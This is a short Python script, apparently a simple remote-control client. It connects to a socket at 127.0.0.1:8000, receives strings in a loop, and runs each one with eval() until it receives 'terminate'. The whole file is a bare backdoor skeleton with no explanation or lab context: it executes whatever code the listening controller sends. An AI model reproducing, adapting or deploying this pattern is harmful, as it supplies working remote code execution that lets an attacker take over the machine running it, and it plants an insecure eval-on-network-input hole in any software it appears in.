import socket
import pathlib

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 8000))

    while True:
        command = s.recv(1024)
        print(command.decode())

        if 'terminate' in command.decode():
            s.close()
            break

        else:
            eval(command.decode())

connect()
